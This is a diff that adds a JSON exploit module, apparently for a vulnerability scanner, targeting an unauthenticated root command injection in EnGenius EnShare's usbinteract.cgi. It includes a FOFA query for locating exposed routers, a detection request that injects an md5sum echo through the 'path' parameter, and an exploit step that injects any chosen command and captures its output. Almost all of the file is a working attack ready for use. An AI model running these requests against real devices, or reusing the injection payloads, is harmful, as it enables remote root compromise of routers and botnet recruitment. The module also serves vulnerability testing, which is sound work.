@@ -1,0 +1,89 @@
+{
+  "Name": "EnGenius EnShare IoT Gigabit Cloud Service RCE",
+  "Description": "EnGenius EnShare suffers from an unauthenticated command injection vulnerability. An attacker can inject and execute arbitrary code as the root user via the 'path' GET/POST parameter parsed by 'usbinteract.cgi' script.",
+  "Product": "EnGenius-EnShare",
+  "Homepage": "https://www.engeniustech.com/",
+  "DisclosureDate": "2017-06-05",
+  "Author": "itardc@163.com",
+  "FofaQuery": "app=\"EnGenius-Wireless-Router\"",
+  "Level": "3",
+  "Impact": "",
+  "Recommendation": "",
+  "References": [
+    "https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5413.php",
+    "https://www.exploit-db.com/exploits/42114/",
+    "https://packetstormsecurity.com/files/142792",
+    "https://cxsecurity.com/issue/WLB-2017060050",
+    "https://exchange.xforce.ibmcloud.com/vulnerabilities/127026",
+    "https://www.engeniusnetworks.eu/downloads?field_file_type_tid=27&title=ESR900",
+    "https://www.engeniusnetworks.eu/downloads?field_file_type_tid=27&title=ESR600",
+    "https://www.engeniusnetworks.eu/downloads?field_file_type_tid=27&title=EPG5000",
+    "http://www.vfocus.net/art/20170606/13644.html",
+    "https://badpackets.net/engenius-routers-found-in-mirai-like-botnet/"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "name": "cmd",
+      "type": "input",
+      "value": "id",
+      "show": ""
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "action=7&path=\"|echo -n 'is_vul'|md5sum||\"",
+        "data_type": "text",
+        "follow_redirect": true,
+        "header": {"Content-Type": "application/x-www-form-urlencoded"},
+        "method": "POST",
+        "uri": "/web/cgi-bin/usbinteract.cgi"
+      },
+      "ResponseTest": {
+        "checks": [
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "c32fa8bb5be1321320f9dfe045d4731b",
+            "variable": "$body"
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      }
+    }
+  ],
+  "ExploitSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "action=7&path=\"|{{{cmd}}}||\"",
+        "data_type": "text",
+        "follow_redirect": true,
+        "header": {"Content-Type": "application/x-www-form-urlencoded"},
+        "method": "POST",
+        "uri": "/web/cgi-bin/usbinteract.cgi"
+      },
+      "SetVariable": [
+        "output|lastbody|regex|(?s)(.*?)Content-type: text/html"
+      ]
+    }
+  ],
+  "Tags": ["rce"],
+  "CVEIDs": null,
+  "CVSSScore": null,
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": ["EnGenius-Wireless-Router"]
+  }
+}
